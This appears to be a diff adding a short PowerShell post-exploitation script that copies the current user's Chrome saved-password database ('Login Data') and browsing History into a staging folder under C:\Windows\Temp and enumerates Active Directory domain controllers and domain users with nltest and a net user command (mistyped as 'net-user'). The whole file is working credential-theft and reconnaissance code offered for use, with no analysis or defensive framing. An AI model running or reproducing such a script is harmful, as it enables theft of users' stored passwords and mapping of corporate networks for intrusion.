@@ -1,0 +1,4 @@
+#Basic AD enumeration with chrome password manager capture
+
+New-Item -Path "C:\Windows\Temp\" -Name "Directory" -ItemType "directory"; Copy-Item "C:\Users\$env:USERNAME\APPDATA\Local\Google\Chrome\User Data\Default\Login Data" -Destination "C:\Windows\Temp\Directory\"; Copy-Item "C:\Users\$env:USERNAME\APPDATA\Local\Google\Chrome\User Data\Default\History" -Destination "C:\Windows\Temp\Directory\";
+New-Item -Path "C:\Windows\Temp\Directory\" -Name "clippy.txt" -ItemType "file"; New-Item -Path "C:\Windows\Temp\Directory\" -Name "adenum.txt" -ItemType "file"; New-Item -Path "C:\Windows\Temp\Directory\" -Name "systemEnum.txt" -ItemType "file"; nltest /dclist:$env:USERDOMAIN > C:\Windows\Temp\Directory\adenum.txt; net-user /domain:$env:USERDOMAIN > C:\Windows\Temp\Directory\adenum.txt
